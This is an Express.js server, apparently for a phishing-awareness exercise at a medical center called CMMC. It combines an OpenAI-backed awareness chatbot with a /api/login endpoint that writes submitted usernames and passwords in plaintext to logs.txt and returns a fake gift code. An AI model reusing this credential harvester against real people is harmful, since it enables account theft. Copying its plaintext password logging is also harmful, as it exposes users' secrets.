import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import OpenAI from "openai";
import fs from "fs";


const app = express();
app.use(cors());
app.use(bodyParser.json());

const client = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

app.post("/api/chat", async (req, res) => {
  try {
    const { messages } = req.body;

    // 1) Sanitize incoming messages
    const sanitizedMessages = (Array.isArray(messages) ? messages : [])
      .filter(
        (m) =>
          m &&
          typeof m.content === "string" &&
          m.content.trim() !== ""
      )
      .map((m) => ({
        role: m.role || "user",
        content: m.content.trim(),
      }));

    // Optional: log what we send to OpenAI for debugging
    console.log("Sanitized messages:", sanitizedMessages);

    // 2) Prepend system prompt
    const fullMessages = [
      {
        role: "system",
        content:
          "You are a cybersecurity awareness assistant for a medical center called CMMC. You give practical, non-technical explanations about phishing, ransomware, and this specific incident. Here is the recent incident happened to CMMC: An attacker sent a fake “$50 Amazon gift card” email, collected an employee’s CMMC username and password, and used those credentials to log into remote desktop and encrypt shared files. Several shared drives became temporarily unavailable. Operations were disrupted for about 10–12 hours, but systems were restored from backups and no ransom was paid.",
      },
      ...sanitizedMessages,
    ];

    const completion = await client.chat.completions.create({
      model: "gpt-4.1-mini",
      messages: fullMessages,
    });

    const reply = completion.choices[0]?.message?.content || "";
    res.json({ reply });
  } catch (err) {
    console.error("Error in /api/chat:", err);
    res.status(500).json({ error: "Error talking to OpenAI" });
  }
});


// app.post("/api/chat", async (req, res) => {
//   try {
//     const { messages } = req.body;

//     // You can prepend a system prompt to keep it on-topic:
//     const fullMessages = [
//       {
//         role: "system",
//         content:
//           "You are a cybersecurity awareness assistant for a medical center called CMMC. You give practical, non-technical explanations about phishing, ransomware, and this specific incident. Here is the recent incident happened to CMMC: An attacker sent a fake “$50 Amazon gift card” email, collected an employee’s CMMC username and password, and used those credentials to log into remote desktop and encrypt shared files. Several shared drives became temporarily unavailable. Operations were disrupted for about 10–12 hours, but systems were restored from backups and no ransom was paid.",
//       },
//       ...(messages || []),
//     ];

//     const completion = await client.chat.completions.create({
//       model: "gpt-4.1-mini",
//       messages: fullMessages,
//     });

//     const reply = completion.choices[0].message.content;
//     res.json({ reply });
//   } catch (err) {
//     console.error(err);
//     res.status(500).json({ error: "Error talking to OpenAI" });
//   }
// });


app.post("/api/login", (req, res) => {
  const { username, password } = req.body;

  // Create a formatted log entry
  const entry =
    "=== CMMC PHISHING Information Received ===\n" +
    `Username: ${username}\n` +
    `Password: ${password}\n` +
    "Timestamp: " + new Date().toISOString() + "\n" +
    "=========================================\n\n";

  // Append to file
  fs.appendFile("logs.txt", entry, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
    }
  });

  // Return fake success response
  res.json({ giftCode: generateGiftCode() });
});

// helper function
function generateGiftCode() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 12; i++) {
    if (i > 0 && i % 4 === 0) code += "-";
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log(`API server listening on port ${PORT}`);
});
